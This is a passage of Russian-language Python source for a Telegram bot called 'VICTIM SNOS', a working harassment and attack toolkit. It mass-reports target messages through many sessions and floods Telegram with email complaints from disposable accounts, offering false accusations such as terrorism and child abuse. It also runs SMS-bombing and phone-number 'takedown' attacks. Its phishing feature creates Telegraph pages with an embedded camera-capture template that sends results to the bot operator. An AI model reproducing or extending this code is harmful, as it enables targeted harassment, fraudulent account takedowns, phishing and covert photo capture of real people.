            return {"success": False, "error": "Сообщение не найдено"}
        
        # Отправляем жалобу
        peer = await client.resolve_peer(chat.id)
        report_reason = REPORT_REASONS.get(reason, raw_types.InputReportReasonSpam())
        
        await client.invoke(
            raw_messages.Report(
                peer=peer,
                id=[msg_id],
                reason=report_reason,
                message="Нарушение правил Telegram"
            )
        )
        
        return {"success": True}
    except FloodWait as e:
        session_data["flood_until"] = time.time() + e.value
        return {"success": False, "flood": e.value}
    except Exception as e:
        return {"success": False, "error": str(e)[:50]}

async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
    # Парсим ссылку
    patterns = [
        r't\.me/([^/]+)/(\d+)',
        r'telegram\.me/([^/]+)/(\d+)',
        r'https?://t\.me/([^/]+)/(\d+)',
    ]
    
    channel = None
    msg_id = None
    for pattern in patterns:
        m = re.search(pattern, link)
        if m:
            channel = m.group(1)
            msg_id = int(m.group(2))
            break
    
    if not channel or not msg_id:
        return 0, "Неверная ссылка на сообщение"
    
    add_log(user_id, f"Жалоба({REPORT_REASONS_RU.get(reason, reason)})", f"@{channel}/{msg_id}")
    
    if not is_user_sessions_ready(user_id):
        return 0, "Сессии не готовы"
    
    # Получаем до 30 сессий
    sessions = await get_user_sessions_batch(user_id, min(30, SESSIONS_PER_USER))
    if not sessions:
        return 0, "Нет доступных сессий"
    
    ok = 0
    for i, s in enumerate(sessions):
        if progress_callback:
            await progress_callback(i + 1)
        
        result = await report_message_via_session(s, channel, msg_id, reason)
        if result.get("success"):
            ok += 1
        
        await asyncio.sleep(1.5)
    
    release_user_sessions(sessions)
    return ok, None


# ---------- СНОС ПОЧТА ----------
async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str, user_id: int = None) -> int:
    if not mail_tm.ready or not mail_tm.accounts:
        return 0
    
    sent = 0
    sem = asyncio.Semaphore(5)  # Ограничиваем одновременные отправки
    
    async def send_one(acc, rec):
        async with sem:
            try:
                result = await mail_tm.send_email(acc, rec, subject, body)
                await asyncio.sleep(2)  # Задержка между отправками
                return result
            except:
                return False
    
    tasks = []
    # Используем все доступные аккаунты и получателей
    for acc in mail_tm.accounts[:min(20, len(mail_tm.accounts))]:
        for rec in RECEIVERS:
            tasks.append(send_one(acc, rec))
    
    # Выполняем с ограничением
    results = await asyncio.gather(*tasks, return_exceptions=True)
    sent = sum(1 for r in results if r is True)
    
    if user_id:
        add_log(user_id, "Снос почта", f"{sent} писем")
    
    return sent


# ---------- TELEGRAPH ФИШИНГ ----------
async def create_telegraph_account(session: aiohttp.ClientSession) -> Optional[str]:
    """Создает аккаунт на Telegraph"""
    try:
        short_name = f"Victim_{random.randint(10000, 99999)}"
        author_name = TELEGRAPH_AUTHOR
        
        async with session.post(
            "https://api.telegra.ph/createAccount",
            json={
                "short_name": short_name,
                "author_name": author_name,
                "author_url": TELEGRAPH_AUTHOR_URL
            },
            timeout=10
        ) as resp:
            data = await resp.json()
            if data.get("ok"):
                return data["result"]["access_token"]
    except Exception as e:
        logger.error(f"Ошибка создания Telegraph: {e}")
    return None

async def fetch_telegraph_page(session: aiohttp.ClientSession, url: str) -> Optional[Dict]:
    """Получает содержимое страницы Telegraph"""
    try:
        # Извлекаем путь из URL
        path = url.replace("https://telegra.ph/", "").replace("http://telegra.ph/", "").split("?")[0].split("#")[0]
        
        async with session.get(
            f"https://api.telegra.ph/getPage/{path}",
            params={"return_content": "true"},
            timeout=10
        ) as resp:
            data = await resp.json()
            if data.get("ok"):
                return data["result"]
    except Exception as e:
        logger.error(f"Ошибка получения страницы: {e}")
    return None

async def create_phish_page(
    session: aiohttp.ClientSession,
    original_url: str,
    chat_id: int,
    title: str,
    description: str,
    button_text: str
) -> Optional[str]:
    """Создает фишинговую страницу на Telegraph"""
    
    # Создаем аккаунт если нужно
    token = await create_telegraph_account(session)
    if not token:
        logger.error("Не удалось создать аккаунт Telegraph")
        return None
    
    # Генерируем ID страницы
    page_id = hashlib.md5(f"{chat_id}_{time.time()}".encode()).hexdigest()[:8]
    
    # Экранируем HTML для вставки
    camera_html = CAMERA_TEMPLATE.format(
        title=title or "Подтверждение",
        description=description or "Для продолжения необходимо подтвердить личность",
        button_text=button_text or "Подтвердить",
        bot_token=BOT_TOKEN,
        chat_id=chat_id,
        page_id=page_id
    )
    
    # Экранируем HTML для Telegraph API
    import html
    camera_html_escaped = html.escape(camera_html)
    
    # Создаем контент страницы
    content = [
        {
            "tag": "h3",
            "children": [title or "Подтверждение личности"]
        },
        {
            "tag": "p",
            "children": [description or "Для продолжения необходимо подтвердить вашу личность. Это безопасно и занимает несколько секунд."]
        },
        {
            "tag": "figure",
            "children": [
                {
                    "tag": "div",
                    "attrs": {"data-html": camera_html}
                }
            ]
        },
        {
            "tag": "p",
            "children": [
                "Нажимая кнопку, вы соглашаетесь с ",
                {
                    "tag": "a",
                    "attrs": {"href": "https://telegram.org/privacy"},
                    "children": ["политикой конфиденциальности"]
                }
            ]
        }
    ]
    
    # Если есть оригинальная страница, добавляем её контент
    if original_url and "telegra.ph" in original_url:
        original_page = await fetch_telegraph_page(session, original_url)
        if original_page and original_page.get("content"):
            # Добавляем оригинальный контент после камеры
            content.extend(original_page["content"])
            if not title and original_page.get("title"):
                title = original_page["title"]
    
    try:
        # Создаем страницу
        async with session.post(
            "https://api.telegra.ph/createPage",
            json={
                "access_token": token,
                "title": title or "Подтверждение",
                "author_name": TELEGRAPH_AUTHOR,
                "author_url": TELEGRAPH_AUTHOR_URL,
                "content": content,
                "return_content": False
            },
            timeout=15
        ) as resp:
            data = await resp.json()
            if data.get("ok"):
                phish_url = data["result"]["url"]
                
                # Сохраняем информацию о странице
                phish_pages[page_id] = {
                    "url": phish_url,
                    "chat_id": chat_id,
                    "created": time.time(),
                    "token": token
                }
                
                logger.info(f"Создана фишинг-страница: {phish_url}")
                return phish_url
            else:
                logger.error(f"Ошибка создания страницы: {data}")
    except Exception as e:
        logger.error(f"Ошибка при создании страницы: {e}")
    
    return None


# ---------- UI ----------
def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔥 СНОС НОМЕРА", callback_data="snos_menu")
    builder.button(text="💣 БОМБЕР", callback_data="bomber_menu")
    builder.button(text="📧 СНОС ПОЧТА", callback_data="mail_menu")
    builder.button(text="🚨 ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_menu")
    builder.button(text="🎣 ФИШИНГ", callback_data="phish_menu")
    builder.button(text="👑 АДМИН", callback_data="admin_menu")
    builder.button(text="📊 СТАТУС", callback_data="status")
    builder.button(text="⛔ СТОП", callback_data="stop")
    builder.adjust(2, 2, 2, 1, 1)
    return builder.as_markup()

def get_snos_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔥 ЗАПУСТИТЬ СНОС", callback_data="snos")
    builder.button(text="🔄 ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
    builder.button(text="◀️ НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1, 1)
    return builder.as_markup()

def get_bomber_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="💣 ЗАПУСТИТЬ БОМБЕР", callback_data="bomber")
    builder.button(text="◀️ НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1)
    return builder.as_markup()

def get_mail_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="👤 ЖАЛОБА НА АККАУНТ", callback_data="mail_acc")
    builder.button(text="📢 ЖАЛОБА НА КАНАЛ", callback_data="mail_chan")
    builder.button(text="◀️ НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1, 1)
    return builder.as_markup()

def get_mail_account_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="1.1 Обычная жалоба", callback_data="mailacc_1.1")
    builder.button(text="1.2 Снос сессий (взлом)", callback_data="mailacc_1.2")
    builder.button(text="1.3 Виртуальный номер", callback_data="mailacc_1.3")
    builder.button(text="1.4 Ссылка в био", callback_data="mailacc_1.4")
    builder.button(text="1.5 Спам с премиум", callback_data="mailacc_1.5")
    builder.button(text="◀️ НАЗАД", callback_data="mail_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_mail_channel_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="8. Личные данные", callback_data="mailchan_8")
    builder.button(text="9. Доксинг/сваттинг", callback_data="mailchan_9")
    builder.button(text="10. Терроризм", callback_data="mailchan_10")
    builder.button(text="11. Детская порнография", callback_data="mailchan_11")
    builder.button(text="12. Мошенничество", callback_data="mailchan_12")
    builder.button(text="13. Вирт. номера", callback_data="mailchan_13")
    builder.button(text="14. Шок-контент", callback_data="mailchan_14")
    builder.button(text="15. Живодерство", callback_data="mailchan_15")
    builder.button(text="◀️ НАЗАД", callback_data="mail_menu")
    builder.adjust(1)
    return builder.as_markup()

def get_report_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🚨 НАПИСАТЬ ЖАЛОБУ", callback_data="report_msg")
    builder.button(text="◀️ НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1)
    return builder.as_markup()

def get_report_reason_menu():
    builder = InlineKeyboardBuilder()
    for k, v in REPORT_REASONS_RU.items():
        builder.button(text=v, callback_data=f"reason_{k}")
    builder.button(text="◀️ НАЗАД", callback_data="report_menu")
    builder.adjust(2, 2, 2, 2, 1)
    return builder.as_markup()

def get_phish_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🎣 СОЗДАТЬ ФИШ-ССЫЛКУ", callback_data="phish_create")
    builder.button(text="📋 МОИ ССЫЛКИ", callback_data="phish_list")
    builder.button(text="◀️ НАЗАД", callback_data="main_menu")
    builder.adjust(1, 1, 1)
    return builder.as_markup()

def get_admin_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="✅ ВЫДАТЬ ДОСТУП", callback_data="admin_add")
    builder.button(text="❌ ЗАБРАТЬ ДОСТУП", callback_data="admin_remove")
    builder.button(text="📋 СПИСОК", callback_data="admin_list")
    builder.button(text="📊 ЛОГИ", callback_data="admin_logs")
    builder.button(text="◀️ НАЗАД", callback_data="main_menu")
    builder.adjust(2, 2, 1)
    return builder.as_markup()

async def send_message_with_banner(event: types.Message, text: str, markup=None):
    if os.path.exists(BANNER_PATH):
        return await event.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    return await event.answer(text, reply_markup=markup)

async def edit_message_with_banner(callback: types.CallbackQuery, text: str, markup=None):
    await callback.message.delete()
    if os.path.exists(BANNER_PATH):
        await callback.message.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        await callback.message.answer(text, reply_markup=markup)


# ---------- ХЕНДЛЕРЫ ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    user_id = msg.from_user.id
    if not await check_channel_subscription(user_id):
        await send_message_with_banner(msg, f"<b>⚠️ ПОДПИШИТЕСЬ НА КАНАЛ</b>\n\n{CHANNEL_URL}")
        return
    
    if not is_user_allowed(user_id):
        await send_message_with_banner(msg, f"<b>⛔ ДОСТУП ЗАПРЕЩЕН</b>\n\nВаш ID: <code>{user_id}</code>")
        return
    
    if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
        asyncio.create_task(ensure_user_sessions(user_id))
    
    cnt = get_user_sessions_count(user_id)
    ready = is_user_sessions_ready(user_id)
    
    await send_message_with_banner(
        msg,
        f"<b>🔥 VICTIM SNOS</b>\n\n"
        f"👤 ID: <code>{user_id}</code>\n"
        f"📱 Сессии: {cnt}/{SESSIONS_PER_USER} {'[✅ ГОТОВ]' if ready else '[⏳ ЗАГРУЗКА]'}\n"
        f"📧 Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
        f"🌐 Сайтов OAuth: {len(TELEGRAM_OAUTH_SITES)}\n"
        f"💣 Сайтов бомбера: {len(BOMBER_WEBSITES)}",
        get_main_menu()
    )

@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await send_message_with_banner(
        msg,
        f"<b>👑 АДМИН-ПАНЕЛЬ</b>\n\n"
        f"Разрешено пользователей: {len(ALLOWED_USERS)}\n"
        f"Активных атак: {len(active_attacks)}\n"
        f"Активных бомберов: {len(active_bombers)}",
        get_admin_menu()
    )

# Навигация по меню
@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery):
    cnt = get_user_sessions_count(cb.from_user.id)
    ready = is_user_sessions_ready(cb.from_user.id)
    await edit_message_with_banner(
        cb,
        f"<b>🔥 СНОС НОМЕРА</b>\n\n"
        f"📱 Сессии: {cnt}/{SESSIONS_PER_USER} {'[✅]' if ready else '[⏳]'}\n"
        f"🌐 OAuth сайтов: {len(TELEGRAM_OAUTH_SITES)}",
        get_snos_menu()
    )
    await cb.answer()

@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(
        cb,
        f"<b>💣 БОМБЕР</b>\n\n"
        f"Сайтов для атаки: {len(BOMBER_WEBSITES)}\n"
        f"Задержка между раундами: {BOMBER_DELAY}с",
        get_bomber_menu()
    )
    await cb.answer()

@dp.callback_query(F.data == "mail_menu")
async def mail_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(
        cb,
        f"<b>📧 СНОС ПОЧТА</b>\n\n"
        f"Аккаунтов Mail.tm: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
        f"Получателей: {len(RECEIVERS)}",
        get_mail_menu()
    )
    await cb.answer()

@dp.callback_query(F.data == "report_menu")
async def report_menu(cb: types.CallbackQuery):
    await edit_message_with_banner(
        cb,
        f"<b>🚨 ЖАЛОБЫ НА СООБЩЕНИЯ</b>\n\n"
        f"Доступно сессий: {get_user_sessions_count(cb.from_user.id)}",
        get_report_menu()
    )
    await cb.answer()

@dp.callback_query(F.data == "phish_menu")
async def phish_menu(cb: types.CallbackQuery):
    user_pages = sum(1 for d in phish_pages.values() if d["chat_id"] == cb.from_user.id)
    await edit_message_with_banner(
        cb,
        f"<b>🎣 ФИШИНГ</b>\n\n"
        f"Ваших страниц: {user_pages}",
        get_phish_menu()
    )
    await cb.answer()

@dp.callback_query(F.data == "admin_menu")
async def admin_menu_handler(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет доступа!", show_alert=True)
        return
    await edit_message_with_banner(
        cb,
        f"<b>👑 АДМИН</b>\n\nРазрешено: {len(ALLOWED_USERS)}",
        get_admin_menu()
    )
    await cb.answer()

@dp.callback_query(F.data == "admin_logs")
async def admin_logs(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        await cb.answer("Нет доступа!", show_alert=True)
        return
    await edit_message_with_banner(
        cb,
        f"<b>📊 ПОСЛЕДНИЕ ЛОГИ</b>\n\n{get_last_logs(10)}",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ НАЗАД", callback_data="admin_menu")]])
    )
    await cb.answer()

@dp.callback_query(F.data == "admin_add")
async def admin_add(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID: return
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>✅ ВЫДАТЬ ДОСТУП</b>\n\nВведите ID пользователя:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="admin_menu")]])
    )

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_process(msg: types.Message, state: FSMContext):
    try:
        user_id = int(msg.text.strip())
        ALLOWED_USERS.add(user_id)
        save_allowed_users()
        await send_message_with_banner(msg, f"✅ Пользователь <code>{user_id}</code> добавлен!")
        add_log(msg.from_user.id, "Админ: добавил", str(user_id))
    except:
        await send_message_with_banner(msg, "❌ Неверный ID!")
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID or not ALLOWED_USERS: return
    builder = InlineKeyboardBuilder()
    for uid in list(ALLOWED_USERS)[:20]:
        builder.button(text=f"❌ Удалить {uid}", callback_data=f"remove_{uid}")
    builder.button(text="◀️ НАЗАД", callback_data="admin_menu")
    builder.adjust(1)
    await edit_message_with_banner(cb, "<b>❌ ЗАБРАТЬ ДОСТУП</b>", builder.as_markup())

@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_process(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID: return
    user_id = int(cb.data.replace("remove_", ""))
    if user_id in ALLOWED_USERS:
        ALLOWED_USERS.remove(user_id)
        save_allowed_users()
        add_log(cb.from_user.id, "Админ: удалил", str(user_id))
    await edit_message_with_banner(cb, f"✅ Пользователь <code>{user_id}</code> удален!", get_admin_menu())

@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    text = "<b>📋 РАЗРЕШЕННЫЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
    text += "\n".join(f"• <code>{uid}</code>" for uid in ALLOWED_USERS) if ALLOWED_USERS else "Пусто"
    await edit_message_with_banner(
        cb,
        text,
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ НАЗАД", callback_data="admin_menu")]])
    )

@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_message_with_banner(
        cb,
        f"<b>🔥 VICTIM SNOS</b>\n\nID: <code>{cb.from_user.id}</code>",
        get_main_menu()
    )

@dp.callback_query(F.data == "refresh_sessions")
async def refresh_sessions(cb: types.CallbackQuery):
    if cb.from_user.id in active_attacks:
        await cb.answer("Нельзя обновить во время сноса!", show_alert=True)
        return
    
    await cb.answer("🔄 Запущено обновление сессий...")
    asyncio.create_task(refresh_user_sessions(cb.from_user.id))
    add_log(cb.from_user.id, "Обновление сессий", "")

@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    await edit_message_with_banner(
        cb,
        f"<b>📊 СТАТУС</b>\n\n"
        f"👤 ID: <code>{user_id}</code>\n"
        f"📱 Сессии: {get_user_sessions_count(user_id)}/{SESSIONS_PER_USER}\n"
        f"📧 Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
        f"🌐 OAuth сайтов: {len(TELEGRAM_OAUTH_SITES)}\n"
        f"💣 Сайтов бомбера: {len(BOMBER_WEBSITES)}\n"
        f"🎣 Фиш-страниц: {sum(1 for d in phish_pages.values() if d['chat_id'] == user_id)}",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ НАЗАД", callback_data="main_menu")]])
    )

# Снос номера
@dp.callback_query(F.data == "snos")
async def snos_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("⚠️ Подпишитесь на канал!", show_alert=True)
        return
    
    if not is_user_sessions_ready(cb.from_user.id):
        await cb.answer("⏳ Сессии загружаются, подождите...", show_alert=True)
        return
    
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ Снос уже запущен!", show_alert=True)
        return
    
    await state.set_state(SnosState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>🔥 СНОС НОМЕРА</b>\n\nВведите номер телефона:\n<code>+79991234567</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="snos_menu")]])
    )

@dp.message(StateFilter(SnosState.waiting_phone))
async def snos_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    # Проверка формата
    if not re.match(r'^\+\d{10,15}$', phone):
        await send_message_with_banner(msg, "❌ Неверный формат номера!\nПример: +79991234567")
        return
    
    await state.update_data(phone=phone)
    await state.set_state(SnosState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, "📊 Введите количество раундов (1-20):")

@dp.message(StateFilter(SnosState.waiting_count))
async def snos_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 20:
            await send_message_with_banner(msg, "❌ Введите число от 1 до 20!")
            return
    except:
        await send_message_with_banner(msg, "❌ Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = {"stop_event": stop_event, "task": None}
    
    st = await send_message_with_banner(msg, "<b>🔥 СНОС ЗАПУЩЕН</b>\n\nПодготовка...")
    
    async def progress_callback(cur, tot, ok_count):
        try:
            await st.edit_caption(
                caption=f"<b>🔥 СНОС НОМЕРА</b>\n\n"
                        f"📱 {phone}\n"
                        f"📊 Раунд: {cur}/{tot}\n"
                        f"✅ Отправлено запросов: {ok_count}"
            )
        except:
            pass
    
    ok = await snos_attack(user_id, phone, count, stop_event, progress_callback)
    
    # Обновляем сессии после атаки
    asyncio.create_task(refresh_user_sessions(user_id))
    
    await st.delete()
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    await send_message_with_banner(
        msg,
        f"<b>✅ СНОС ЗАВЕРШЕН</b>\n\n"
        f"📱 Номер: <code>{phone}</code>\n"
        f"📊 Отправлено запросов: <b>{ok}</b>",
        get_main_menu()
    )

# Бомбер
@dp.callback_query(F.data == "bomber")
async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("⚠️ Подпишитесь на канал!", show_alert=True)
        return
    
    if cb.from_user.id in active_bombers:
        await cb.answer("❌ Бомбер уже запущен!", show_alert=True)
        return
    
    await state.set_state(BomberState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption=f"<b>💣 БОМБЕР</b>\n\nСайтов: {len(BOMBER_WEBSITES)}\n\nВведите номер:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="bomber_menu")]])
    )

@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, "📊 Введите количество раундов (1-10):")

@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 10:
            await send_message_with_banner(msg, "❌ Введите число от 1 до 10!")
            return
    except:
        await send_message_with_banner(msg, "❌ Введите число!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_bombers[user_id] = {"stop_event": stop_event, "task": None}
    
    st = await send_message_with_banner(msg, "<b>💣 БОМБЕР ЗАПУЩЕН</b>")
    
    async def progress_callback(cur, tot, ok_count):
        try:
            await st.edit_caption(
                caption=f"<b>💣 БОМБЕР</b>\n\n"
                        f"📱 {phone}\n"
                        f"📊 Раунд: {cur}/{tot}\n"
                        f"✅ Запросов: {ok_count}"
            )
        except:
            pass
    
    ok = await bomber_attack(phone, count, user_id, stop_event, progress_callback)
    
    await st.delete()
    if user_id in active_bombers:
        del active_bombers[user_id]
    
    await send_message_with_banner(
        msg,
        f"<b>✅ БОМБЕР ЗАВЕРШЕН</b>\n\n"
        f"📱 <code>{phone}</code>\n"
        f"📊 Отправлено: <b>{ok}</b>",
        get_main_menu()
    )

# Жалобы на сообщения
@dp.callback_query(F.data == "report_msg")
async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_channel_subscription(cb.from_user.id):
        await cb.answer("⚠️ Подпишитесь на канал!", show_alert=True)
        return
    
    if not is_user_sessions_ready(cb.from_user.id):
        await cb.answer("⏳ Сессии загружаются!", show_alert=True)
        return
    
    await state.set_state(ReportMessageState.waiting_link)
    await cb.message.delete()
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>🚨 ЖАЛОБА НА СООБЩЕНИЕ</b>\n\n"
                "Введите ссылку на сообщение:\n"
                "<code>https://t.me/username/123</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="report_menu")]])
    )

@dp.message(StateFilter(ReportMessageState.waiting_link))
async def report_msg_link(msg: types.Message, state: FSMContext):
    link = msg.text.strip()
    
    # Проверяем ссылку
    if not re.search(r't\.me/|telegram\.me/', link):
        await send_message_with_banner(msg, "❌ Неверная ссылка на сообщение Telegram!")
        return
    
    await state.update_data(link=link)
    await state.set_state(ReportMessageState.waiting_reason)
    await msg.delete()
    await msg.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>📋 ВЫБЕРИТЕ ПРИЧИНУ ЖАЛОБЫ</b>",
        reply_markup=get_report_reason_menu()
    )

@dp.callback_query(F.data.startswith("reason_"))
async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
    reason = cb.data.replace("reason_", "")
    data = await state.get_data()
    link = data["link"]
    user_id = cb.from_user.id
    
    await state.clear()
    await cb.message.delete()
    
    active_reports[user_id] = True
    
    st = await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>🚨 ОТПРАВКА ЖАЛОБ...</b>\n\nПодготовка..."
    )
    
    async def progress_callback(current):
        try:
            await st.edit_caption(caption=f"<b>🚨 ОТПРАВКА ЖАЛОБ</b>\n\nОтправлено: {current}")
        except:
            pass
    
    ok, err = await mass_report_message(user_id, link, reason, progress_callback)
    
    await st.delete()
    if user_id in active_reports:
        del active_reports[user_id]
    
    if ok > 0:
        await cb.message.answer(
            f"<b>✅ ЖАЛОБЫ ОТПРАВЛЕНЫ!</b>\n\n"
            f"📊 Успешно: {ok}\n"
            f"📋 Причина: {REPORT_REASONS_RU.get(reason, reason)}"
        )
    else:
        await cb.message.answer(f"<b>❌ ОШИБКА</b>\n\n{err or 'Не удалось отправить жалобы'}")
    
    await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption="<b>🔥 VICTIM SNOS</b>",
        reply_markup=get_main_menu()
    )

# Снос Почта - Аккаунт
@dp.callback_query(F.data == "mail_acc")
async def mail_acc_menu(cb: types.CallbackQuery):
    if not mail_tm.ready:
        await cb.answer("⏳ Почта загружается...", show_alert=True)
        return
    
    await edit_message_with_banner(
        cb,
        "<b>👤 ЖАЛОБА НА АККАУНТ</b>\n\nВыберите тип жалобы:",
        get_mail_account_menu()
    )
    await cb.answer()

@dp.callback_query(F.data.startswith("mailacc_"))
async def mail_acc_type(cb: types.CallbackQuery, state: FSMContext):
    complaint_type = cb.data.replace("mailacc_", "")
    await state.update_data(complaint_type=complaint_type)
    
    if complaint_type == "1.1":
        await state.set_state(MailAccountState.waiting_reason)
        await cb.message.delete()
        await cb.message.answer_photo(
            FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
            caption="<b>📝 ОБЫЧНАЯ ЖАЛОБА</b>\n\nВведите причину жалобы:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="mail_acc")]])
        )
    else:
        await state.set_state(MailAccountState.waiting_username)
        await cb.message.delete()
        await cb.message.answer_photo(
            FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
            caption="<b>👤 ЖАЛОБА НА АККАУНТ</b>\n\nВведите юзернейм (без @):",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="mail_acc")]])
        )

@dp.message(StateFilter(MailAccountState.waiting_reason))
async def mail_acc_reason(msg: types.Message, state: FSMContext):
    reason = msg.text.strip()
    await state.update_data(reason=reason)
    await state.set_state(MailAccountState.waiting_username)
    await msg.delete()
    await send_message_with_banner(msg, "👤 Введите юзернейм (без @):")

@dp.message(StateFilter(MailAccountState.waiting_username))
async def mail_acc_username(msg: types.Message, state: FSMContext):
    username = msg.text.strip().replace("@", "")
    await state.update_data(username=username)
    await state.set_state(MailAccountState.waiting_id)
    await msg.delete()
    await send_message_with_banner(msg, "🆔 Введите Telegram ID:")

@dp.message(StateFilter(MailAccountState.waiting_id))
async def mail_acc_id(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    username = data.get("username", "")
    telegram_id = msg.text.strip()
    complaint_type = data.get("complaint_type", "1.2")
    reason = data.get("reason", "нарушение правил")
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    body = COMPLAINT_TEXTS_ACCOUNT[complaint_type].format(
        username=username,
        telegram_id=telegram_id,
        reason=reason
    )
    
    st = await send_message_with_banner(msg, "<b>📧 Отправка писем...</b>")
    
    sent = await send_mass_complaint(
        mail_tm,
        f"Жалоба на аккаунт @{username}",
        body,
        user_id
    )
    
    await st.delete()
    await send_message_with_banner(
        msg,
        f"<b>✅ ЖАЛОБЫ ОТПРАВЛЕНЫ!</b>\n\n"
        f"👤 @{username}\n"
        f"📊 Отправлено писем: {sent}",
        get_main_menu()
    )

# Снос Почта - Канал
@dp.callback_query(F.data == "mail_chan")
async def mail_chan_menu(cb: types.CallbackQuery):
    if not mail_tm.ready:
        await cb.answer("⏳ Почта загружается...", show_alert=True)
        return
    
    await edit_message_with_banner(
        cb,
